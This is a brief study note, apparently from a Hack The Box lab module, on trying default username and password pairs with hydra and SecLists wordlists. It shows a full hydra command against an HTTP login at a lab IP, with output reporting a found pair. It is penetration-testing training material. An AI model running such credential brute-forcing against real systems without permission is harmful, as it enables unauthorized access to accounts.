---
title: b-Default Passwords
draft: false
tags:
---

It is very common to find pairs of usernames and passwords used together, especially when default service passwords are kept unchanged. That is why it is better to always start with a wordlist of such credential pairs -e.g. `test:test`-, and scan all of them first.

This should not take a long time, and if we could not find any working pairs, we would move to use separate wordlists for each or search for the top 100 most common passwords that can be used.

We can find a list of default password login pairs in the [SecLists](https://github.com/danielmiessler/SecLists) repository as well, specifically in the `/usr/share/seclists/Passwords/Default-Credentials` directory.

`ftp-betterdefaultpasslist.txt` can come handy.

```shell-session
jadu101@htb[/htb]$ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking http-get://178.211.23.155:31099/
[31099][http-get] host: 178.211.23.155   login: test   password: testingpw
[STATUS] attack finished for 178.211.23.155 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

